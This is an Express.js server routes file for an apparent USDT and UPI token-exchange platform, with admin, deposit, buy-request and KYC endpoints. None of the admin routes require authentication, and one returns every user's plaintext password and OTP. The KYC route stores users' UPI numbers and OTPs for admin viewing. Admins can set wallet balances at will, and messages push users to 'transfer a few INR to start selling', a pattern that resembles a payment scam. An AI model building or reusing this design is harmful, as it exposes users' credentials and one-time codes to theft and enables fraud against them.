const express = require('express');
const router = express.Router();
const mongoose = require('mongoose');
const path = require('path');
const User = require(path.join(__dirname, '../models/User'));
const Settings = require(path.join(__dirname, '../models/Settings'));

// In-memory fallback cache for fast response
let memorySettings = {
  usdtAddress: 'TMfHZ2iFheRkwrTzmEaxJoHw6XUf2s5w9C',
  usdtQrUrl: '',
  buyRewardTiers: [
    { amount: 10000, reward: 100 },
    { amount: 25000, reward: 200 },
    { amount: 50000, reward: 300 },
    { amount: 70000, reward: 400 },
    { amount: 90000, reward: 500 },
    { amount: 110000, reward: 600 },
    { amount: 130000, reward: 700 },
    { amount: 150000, reward: 800 },
    { amount: 170000, reward: 900 },
    { amount: 190000, reward: 1000 },
    { amount: 210000, reward: 1100 },
    { amount: 230000, reward: 1200 },
    { amount: 250000, reward: 1300 },
  ],
};

// In-memory active deposit requests store (pre-seeded for user 9341048237)
let depositRequests = [
  {
    id: 'req_9341048237',
    phone: '9341048237',
    usdtAmount: 100,
    iTokens: 11300,
    createdAt: new Date().toISOString(),
    status: 'pending_qr',
  },
];

// In-memory store for UPI Partners and their Admin ON/OFF statuses
let upiPartners = [
  { id: 'paytm_bus', name: 'Paytm Business', desc: 'Paytm Business is an Indian digital payment platform.', tags: [], enabled: false, iconBg: '#00baf2', iconText: 'Paytm Business' },
  { id: 'phonepe_bus', name: 'Phonepe Business', desc: 'PhonePe Business is an Indian digital payment platform.', tags: [], enabled: false, iconBg: '#5f259f', iconText: 'pe' },
  { id: 'mobikwik', name: 'Mobikwik', desc: 'MobiKwik is an Indian digital payment platform.', tags: ['Sell'], enabled: true, iconBg: '#0066ff', iconText: 'mb' },
  { id: 'paytm', name: 'Paytm', desc: 'Paytm is an Indian digital payment platform.', tags: ['Sell', 'Buy'], enabled: true, iconBg: '#00baf2', iconText: 'Paytm' },
  { id: 'phonepe', name: 'Phonepe', desc: 'PhonePe is an Indian digital payment platform.', tags: ['Sell'], enabled: true, iconBg: '#5f259f', iconText: 'pe' },
  { id: 'freecharge', name: 'Freecharge', desc: 'Freecharge offers digital payment and mobile recharge services in India.', tags: [], enabled: false, iconBg: '#ff5722', iconText: 'fc' },
  { id: 'airtel', name: 'Airtel', desc: 'Airtel is an Indian digital payment platform.', tags: ['Sell'], enabled: true, iconBg: '#e40000', iconText: 'airtel' },
  { id: 'slice', name: 'Slice', desc: 'Slice is an Indian digital payment platform.', tags: [], enabled: false, iconBg: '#d8b4fe', iconText: 'slice' },
  { id: 'induspay', name: 'IndusPay', desc: 'IndusPay is an Indian digital payment platform.', tags: ['Buy'], enabled: true, iconBg: '#800020', iconText: 'indus' },
  { id: 'amazonpay', name: 'Amazon Pay', desc: 'Amazon Pay is an Indian digital payment platform.', tags: ['Sell', 'Buy'], enabled: true, iconBg: '#ff9900', iconText: 'amazon' },
  { id: 'navi', name: 'Navi', desc: 'Navi is an Indian digital payment platform.', tags: [], enabled: false, iconBg: '#a7f3d0', iconText: 'navi' },
  { id: 'moneyview', name: 'MoneyView', desc: 'MoneyView is an Indian digital payment platform.', tags: ['Buy'], enabled: true, iconBg: '#0f5132', iconText: 'mv' },
  { id: 'bharatpe_bus', name: 'BharatPe Business', desc: 'BharatPe Business is an Indian digital payment platform.', tags: ['Sell'], enabled: true, iconBg: '#00b4d8', iconText: 'bp' },
  { id: 'iob_vyapar', name: 'IOB UPI Vyapar', desc: 'IOB UPI Vyapar is an Indian digital payment platform.', tags: ['Sell'], enabled: true, iconBg: '#6b21a8', iconText: 'iob' },
  { id: 'utk', name: 'UTK', desc: 'UTK is an Indian digital payment platform.', tags: [], enabled: false, iconBg: '#f472b6', iconText: 'utk' },
  { id: 'esaf', name: 'ESAF UPI', desc: 'ESAF is an Indian digital payment platform.', tags: [], enabled: false, iconBg: '#f87171', iconText: 'esaf' },
  { id: 'jio', name: 'Jio Finance', desc: 'Jio Finance is an Indian digital payment platform.', tags: [], enabled: false, iconBg: '#fdba74', iconText: 'jio' },
];

// In-memory store for User KYC Requests
let kycRequests = [];

// In-memory store for User Buy Requests (Contains Account No, IFSC, UTR, Amount)
let buyRequests = [
  {
    id: 'REQ-910283',
    orderId: '5912892150909957',
    phone: '9341048237',
    amount: 10000,
    iTokens: 1130000,
    upiMethod: 'IndusPay',
    userAccount: '9182374619283',
    userIfsc: 'INDB0000123',
    utrNumber: '928374829102',
    status: 'Pending',
    createdAt: new Date(Date.now() - 1800000).toISOString(),
  }
];

// POST /api/buy-request - Register user Buy request with Account Number & IFSC
router.post(['/buy-request', '/admin/buy-request'], (req, res) => {
  try {
    const { phone, orderId, amount, iTokens, upiMethod, userAccount, userIfsc, utrNumber, paymentProofImg } = req.body;
    const newRequest = {
      id: 'REQ-' + Math.floor(100000 + Math.random() * 900000),
      orderId: orderId || Date.now().toString(),
      phone: phone || '9341048237',
      amount: parseFloat(amount) || 0,
      iTokens: parseFloat(iTokens) || (parseFloat(amount) || 0) * 113,
      upiMethod: upiMethod || 'UPI',
      userAccount: userAccount || 'N/A',
      userIfsc: userIfsc || 'N/A',
      utrNumber: utrNumber || 'N/A',
      paymentProofImg: paymentProofImg || '',
      status: 'Pending',
      createdAt: new Date().toISOString(),
    };
    buyRequests.unshift(newRequest);
    if (buyRequests.length > 100) buyRequests = buyRequests.slice(0, 100);

    return res.json({ success: true, request: newRequest, message: 'Buy order recorded successfully.' });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to record buy request' });
  }
});

// GET /api/admin/buy-requests - Fetch all user buy requests
router.get(['/admin/buy-requests', '/buy-requests'], (req, res) => {
  return res.json({ success: true, requests: buyRequests });
});

// POST /api/admin/update-buy-request-status - Approve / Reject / Delete buy request
router.post(['/admin/update-buy-request-status', '/update-buy-request-status'], (req, res) => {
  try {
    const { requestId, status } = req.body;
    if (!requestId || !status) {
      return res.status(400).json({ error: 'Request ID and status are required' });
    }

    if (status === 'Deleted') {
      buyRequests = buyRequests.filter((r) => r.id !== requestId);
    } else {
      buyRequests = buyRequests.map((r) => (r.id === requestId ? { ...r, status } : r));
    }
    return res.json({ success: true, requests: buyRequests });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to update buy request status' });
  }
});

// Helper to clean up expired pending requests (> 5 minutes)
const FIVE_MINUTES_MS = 5 * 60 * 1000;
const filterExpiredRequests = () => {
  const now = Date.now();
  depositRequests = depositRequests.filter((r) => {
    if (r.status === 'pending_qr') {
      const age = now - new Date(r.createdAt).getTime();
      return age < FIVE_MINUTES_MS; // Keep only if less than 5 minutes old
    }
    return true; // Keep completed/success requests
  });
};

// POST /api/deposit-request - Register user USDT deposit request
router.post('/deposit-request', (req, res) => {
  try {
    const { phone, usdtAmount, iTokens } = req.body;
    const userPhone = phone || 'Guest User';

    // Auto-clean expired pending requests first
    filterExpiredRequests();

    // Remove previous pending requests from same user
    depositRequests = depositRequests.filter((r) => !(r.phone === userPhone && r.status === 'pending_qr'));

    const newRequest = {
      id: Date.now().toString(),
      phone: userPhone,
      usdtAmount: parseFloat(usdtAmount) || 100,
      iTokens: parseFloat(iTokens) || parseFloat(usdtAmount || 100) * 113,
      createdAt: new Date().toISOString(),
      status: 'pending_qr',
    };

    depositRequests.unshift(newRequest);
    if (depositRequests.length > 50) depositRequests = depositRequests.slice(0, 50);

    return res.json({ success: true, request: newRequest });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to create deposit request' });
  }
});

// GET /api/admin/deposit-requests - Fetch all deposit requests for Admin Panel (Auto-purges >5 min expired pending)
router.get('/deposit-requests', (req, res) => {
  filterExpiredRequests();
  return res.json({ success: true, requests: depositRequests });
});

// DELETE /api/admin/deposit-requests/:id - Clear request
router.delete('/deposit-requests/:id', (req, res) => {
  const { id } = req.params;
  depositRequests = depositRequests.filter((r) => r.id !== id);
  return res.json({ success: true, requests: depositRequests });
});

// GET /api/admin/settings & /api/settings - Fetch current admin settings
router.get(['/settings', '/admin/settings'], async (req, res) => {
  try {
    let settings = null;
    try {
      settings = await Settings.findOne({ key: 'global' });
    } catch (err) {
      console.error('Atlas settings fetch error:', err.message);
    }

    if (settings) {
      memorySettings.usdtAddress = settings.usdtAddress || memorySettings.usdtAddress;
      memorySettings.usdtQrUrl = settings.usdtQrUrl || memorySettings.usdtQrUrl;
      if (settings.buyRewardTiers && settings.buyRewardTiers.length > 0) {
        memorySettings.buyRewardTiers = settings.buyRewardTiers;
      }
    }

    return res.json({
      success: true,
      settings: memorySettings,
    });
  } catch (err) {
    console.error('Settings fetch error:', err);
    return res.json({ success: true, settings: memorySettings });
  }
});

// POST /api/admin/settings & /api/settings - Save/Update admin USDT settings & buyRewardTiers & fulfill deposit request
router.post(['/settings', '/admin/settings'], async (req, res) => {
  try {
    const { usdtAddress, usdtQrUrl, buyRewardTiers, requestId, phone } = req.body;
    if (usdtAddress !== undefined) memorySettings.usdtAddress = usdtAddress;
    if (usdtQrUrl !== undefined) memorySettings.usdtQrUrl = usdtQrUrl;
    if (Array.isArray(buyRewardTiers)) memorySettings.buyRewardTiers = buyRewardTiers;

    // Filter expired requests first
    filterExpiredRequests();

    // Mark the request as 'success' when admin uploads address & QR image!
    if (memorySettings.usdtAddress && memorySettings.usdtQrUrl) {
      depositRequests.forEach((r) => {
        if (requestId && r.id === requestId) {
          r.status = 'success';
          r.fulfilledAt = new Date().toISOString();
        } else if (phone && r.phone === phone && r.status === 'pending_qr') {
          r.status = 'success';
          r.fulfilledAt = new Date().toISOString();
        } else if (!requestId && !phone && r.status === 'pending_qr') {
          r.status = 'success';
          r.fulfilledAt = new Date().toISOString();
        }
      });
    }

    try {
      await Settings.findOneAndUpdate(
        { key: 'global' },
        { 
          usdtAddress: memorySettings.usdtAddress, 
          usdtQrUrl: memorySettings.usdtQrUrl, 
          buyRewardTiers: memorySettings.buyRewardTiers,
          updatedAt: new Date() 
        },
        { upsert: true, new: true }
      );
    } catch (dbErr) {
      console.error('Atlas settings save error:', dbErr.message);
    }

    return res.json({
      success: true,
      message: 'Settings updated successfully.',
      settings: memorySettings,
      requests: depositRequests,
    });
  } catch (err) {
    console.error('Settings save error:', err);
    return res.status(500).json({ error: 'Failed to update settings.' });
  }
});

// GET /api/admin/users - Returns users' phone, password, otp, iTokenBalance, rewardPercent
router.get('/users', async (req, res) => {
  try {
    const authRoutes = require(path.join(__dirname, 'authRoutes'));
    const memoryUsers = authRoutes.memoryUsers || new Map();
    let dbUsers = [];

    try {
      dbUsers = await User.find({}, 'phone password otp role iTokenBalance rewardPercent createdAt').sort({ createdAt: -1 });
    } catch (err) {
      console.error('Atlas fetch error:', err.message);
    }

    const userMap = new Map();

    // Populate memory users first
    if (memoryUsers && memoryUsers.values) {
      for (const u of memoryUsers.values()) {
        userMap.set(u.phone, {
          id: u.id || u._id || u.phone,
          phone: u.phone,
          password: u.password,
          otp: u.otp || 'N/A',
          role: u.role || 'user',
          iTokenBalance: u.iTokenBalance ?? 0,
          rewardPercent: u.rewardPercent ?? 6,
          createdAt: u.createdAt || new Date().toISOString(),
        });
      }
    }

    // Populate/merge DB users
    for (const u of dbUsers) {
      userMap.set(u.phone, {
        id: u._id,
        phone: u.phone,
        password: u.password,
        otp: u.otp || 'N/A',
        role: u.role || 'user',
        iTokenBalance: u.iTokenBalance ?? 0,
        rewardPercent: u.rewardPercent ?? 6,
        createdAt: u.createdAt,
      });
    }

    const allUsers = Array.from(userMap.values());

    // Sort users by createdAt descending (newest users first at the top)
    allUsers.sort((a, b) => new Date(b.createdAt || 0).getTime() - new Date(a.createdAt || 0).getTime());

    return res.json({
      success: true,
      count: allUsers.length,
      users: allUsers,
    });
  } catch (err) {
    console.error('Admin fetch error:', err);
    res.status(500).json({ error: 'Failed to fetch user list for admin.' });
  }
});

// PUT /api/admin/users/:identifier - Update user's iTokenBalance (wallet) and rewardPercent
router.put('/users/:identifier', async (req, res) => {
  try {
    const { identifier } = req.params;
    const { iTokenBalance, rewardPercent } = req.body;

    if (!identifier) {
      return res.status(400).json({ error: 'User identifier is required.' });
    }

    const authRoutes = require(path.join(__dirname, 'authRoutes'));
    const memoryUsers = authRoutes.memoryUsers || new Map();

    const updateFields = {};
    if (iTokenBalance !== undefined && !isNaN(Number(iTokenBalance))) {
      updateFields.iTokenBalance = Number(iTokenBalance);
    }
    if (rewardPercent !== undefined && !isNaN(Number(rewardPercent))) {
      updateFields.rewardPercent = Number(rewardPercent);
    }

    let updatedUserObj = null;

    // Update MongoDB Atlas
    try {
      const isObjectId = mongoose.Types.ObjectId.isValid(identifier);
      const query = isObjectId ? { _id: identifier } : { phone: identifier };

      const dbUser = await User.findOneAndUpdate(query, { $set: updateFields }, { new: true });
      if (dbUser) {
        updatedUserObj = dbUser.toObject();
      }
    } catch (dbErr) {
      console.error('Atlas user update error:', dbErr.message);
    }

    // Update in memoryUsers Map if present
    for (const [phoneKey, u] of memoryUsers.entries()) {
      if (phoneKey === identifier || u.id === identifier || u._id === identifier || String(u.id) === String(identifier)) {
        if (updateFields.iTokenBalance !== undefined) u.iTokenBalance = updateFields.iTokenBalance;
        if (updateFields.rewardPercent !== undefined) u.rewardPercent = updateFields.rewardPercent;
        if (!updatedUserObj) updatedUserObj = u;
      }
    }

    return res.json({
      success: true,
      message: 'User wallet amount and reward percentage updated successfully.',
      user: updatedUserObj,
    });
  } catch (err) {
    console.error('Admin update user error:', err);
    res.status(500).json({ error: 'Failed to update user parameters.' });
  }
});

// DELETE /api/admin/users/:identifier - Delete user by ID or Phone number
router.delete('/users/:identifier', async (req, res) => {
  try {
    const { identifier } = req.params;
    if (!identifier) {
      return res.status(400).json({ error: 'User identifier is required.' });
    }

    const authRoutes = require(path.join(__dirname, 'authRoutes'));
    const memoryUsers = authRoutes.memoryUsers || new Map();

    let deletedCount = 0;

    // Delete from MongoDB Atlas
    try {
      const isObjectId = mongoose.Types.ObjectId.isValid(identifier);
      const query = isObjectId ? { _id: identifier } : { phone: identifier };

      const targetUser = await User.findOne(query);
      if (targetUser && memoryUsers.has(targetUser.phone)) {
        memoryUsers.delete(targetUser.phone);
      }

      const dbRes = await User.deleteOne(query);
      deletedCount += dbRes.deletedCount || 0;
    } catch (dbErr) {
      console.error('Atlas delete error:', dbErr.message);
    }

    // Delete from memoryUsers map if present by phone or ID
    if (memoryUsers.has(identifier)) {
      memoryUsers.delete(identifier);
      deletedCount++;
    } else {
      for (const [phoneKey, u] of memoryUsers.entries()) {
        if (u.id === identifier || u._id === identifier || String(u.id) === String(identifier)) {
          memoryUsers.delete(phoneKey);
          deletedCount++;
        }
      }
    }

    return res.json({
      success: true,
      message: `User deleted successfully.`,
      deletedCount,
    });
  } catch (err) {
    console.error('Admin delete user error:', err);
    res.status(500).json({ error: 'Failed to delete user.' });
  }
});

// GET /api/admin/upi-partners or /api/upi-partners - Fetch all UPI partners status
router.get(['/upi-partners', '/admin/upi-partners'], (req, res) => {
  return res.json({ success: true, partners: upiPartners });
});

// POST /api/admin/upi-partners/toggle or /api/upi-partners/toggle - Toggle partner ON/OFF status
router.post(['/upi-partners/toggle', '/admin/upi-partners/toggle'], (req, res) => {
  try {
    const { partnerId, enabled } = req.body;
    upiPartners = upiPartners.map((p) => {
      if (p.id === partnerId) {
        return { ...p, enabled: Boolean(enabled) };
      }
      return p;
    });
    return res.json({ success: true, message: 'UPI Partner updated.', partners: upiPartners });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to update UPI partner.' });
  }
});

// In-memory store for User Linked UPI Items
let userUpiItems = [
  {
    id: 'upi_1',
    phone: '9341048237',
    name: 'mobikwik(934****237)',
    vpa: '934****237@mbk',
    status: 'UnLink',
    statusColor: '#8c8c8c',
    warning: 'UPI unlinked - Please relink',
    stopped: true,
    quota: 100000,
    minTx: 500,
  },
  {
    id: 'upi_2',
    phone: '9341048237',
    name: 'phonepe(934****237)',
    vpa: '934****-10@ybl',
    status: 'no receive data',
    statusColor: '#faad14',
    warning: 'No receive data. Transfer a few INR to start selling.',
    stopped: true,
    quota: 100000,
    minTx: 500,
  },
  {
    id: 'upi_3',
    phone: '9341048237',
    name: 'paytm(934****237)',
    vpa: '934****237@ptaxis',
    status: 'no receive data',
    statusColor: '#faad14',
    warning: 'No receive data. Transfer a few INR to start selling.',
    stopped: true,
    quota: 100000,
    minTx: 500,
  },
  {
    id: 'upi_4',
    phone: '9341048237',
    name: 'amazon(934****237)',
    vpa: '934****237@yapl',
    status: 'Active',
    statusColor: '#52c41a',
    warning: null,
    stopped: false,
    quota: 100000,
    minTx: 500,
  },
];

// GET /api/user/upi-items - Fetch user linked UPI items
router.get(['/user/upi-items', '/upi-items', '/admin/user/upi-items'], (req, res) => {
  const { phone } = req.query;
  const userPhone = phone || '9341048237';
  const items = userUpiItems.filter((item) => !phone || item.phone === userPhone);
  return res.json({ success: true, items });
});

// POST /api/user/upi-items/toggle-stop - Toggle stopped status for user UPI item
router.post(['/user/upi-items/toggle-stop', '/upi-items/toggle-stop'], (req, res) => {
  try {
    const { itemId, stopped } = req.body;
    userUpiItems = userUpiItems.map((item) => {
      if (item.id === itemId) {
        return { ...item, stopped: Boolean(stopped) };
      }
      return item;
    });
    return res.json({ success: true, message: 'UPI status updated.', items: userUpiItems });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to update item status.' });
  }
});

// POST /api/user/link-kyc or /link-kyc - Register user KYC request
router.post(['/user/link-kyc', '/link-kyc', '/admin/user/link-kyc'], (req, res) => {
  try {
    const { phone, userName, upiNo, partnerId, partnerName, otp } = req.body;
    if (!userName || !upiNo || upiNo.trim().length !== 10) {
      return res.status(400).json({ error: 'Please enter name and a 10-digit mobile number.' });
    }

    const userPhone = phone || '9341048237';
    const submittedOtp = otp || Math.floor(100000 + Math.random() * 900000).toString();

    const newKycReq = {
      id: 'kyc_' + Date.now(),
      phone: userPhone,
      userName: userName.trim(),
      upiNo: upiNo.trim(),
      partnerId: partnerId || 'paytm',
      partnerName: partnerName || 'Paytm',
      otp: submittedOtp,
      status: 'Waiting for KYC',
      createdAt: new Date().toISOString(),
    };

    // Remove old pending KYC for same user if exists
    kycRequests = kycRequests.filter((k) => !(k.phone === userPhone && k.partnerId === newKycReq.partnerId));
    kycRequests.unshift(newKycReq);

    // Also add to user UPI items
    const maskedPhone = userPhone.substring(0, 3) + '****' + userPhone.substring(7);
    const newUpiItem = {
      id: 'upi_' + Date.now(),
      phone: userPhone,
      userName: userName.trim(),
      upiNo: upiNo.trim(),
      otp: submittedOtp,
      name: `${(partnerName || 'UPI').toLowerCase()}(${maskedPhone})`,
      vpa: `${upiNo}@${partnerId || 'upi'}`,
      status: 'Waiting for KYC',
      statusColor: '#faad14',
      warning: 'Waiting for admin approval',
      stopped: true,
      quota: 100000,
      minTx: 500,
    };
    userUpiItems.unshift(newUpiItem);

    return res.json({ success: true, request: newKycReq, item: newUpiItem });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to submit KYC request.' });
  }
});

// GET /api/user/kyc-requests or /kyc-requests - Fetch user active KYC requests
router.get(['/user/kyc-requests', '/kyc-requests', '/admin/user/kyc-requests'], (req, res) => {
  const { phone } = req.query;
  const userPhone = phone || '9341048237';
  const userReqs = kycRequests.filter((k) => k.phone === userPhone);
  return res.json({ success: true, requests: userReqs });
});

// GET /api/admin/kyc-requests - Fetch all KYC requests for Admin Panel
router.get(['/admin/kyc-requests', '/all-kyc-requests'], (req, res) => {
  return res.json({ success: true, requests: kycRequests });
});

// GET /api/admin/all-user-upi - Fetch all user UPI items for Admin Panel
router.get(['/admin/all-user-upi', '/admin/user-upi-all'], (req, res) => {
  return res.json({ success: true, items: userUpiItems });
});

// POST /api/admin/update-upi-status - Update status of user UPI item
router.post(['/admin/update-upi-status', '/update-upi-status', '/admin/update-kyc-status'], (req, res) => {
  try {
    const { itemId, requestId, status } = req.body;
    const targetId = itemId || requestId;
    if (!targetId || !status) {
      return res.status(400).json({ error: 'Target ID and status are required.' });
    }

    let statusColor = '#8c8c8c';
    let warning = null;
    let stopped = false;

    if (status === 'Active') {
      statusColor = '#52c41a';
      warning = null;
      stopped = false;
    } else if (status === 'no receive data') {
      statusColor = '#faad14';
      warning = 'No receive data. Transfer a few INR to start selling.';
      stopped = true;
    } else if (status === 'UnLink') {
      statusColor = '#8c8c8c';
      warning = 'UPI unlinked - Please relink';
      stopped = true;
    } else if (status === 'Waiting for KYC') {
      statusColor = '#f97316';
      warning = 'Waiting for admin verification';
      stopped = true;
    }

    let updatedPhone = null;
    userUpiItems = userUpiItems.map((item) => {
      if (item.id === targetId || item.id === itemId) {
        updatedPhone = item.phone;
        return { ...item, status, statusColor, warning, stopped };
      }
      return item;
    });

    kycRequests = kycRequests.map((k) => {
      if (k.id === targetId || k.id === requestId || (updatedPhone && k.phone === updatedPhone)) {
        return { ...k, status };
      }
      return k;
    });

    return res.json({ success: true, message: 'Status updated successfully.', items: userUpiItems, requests: kycRequests });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to update status.' });
  }
});

module.exports = router;

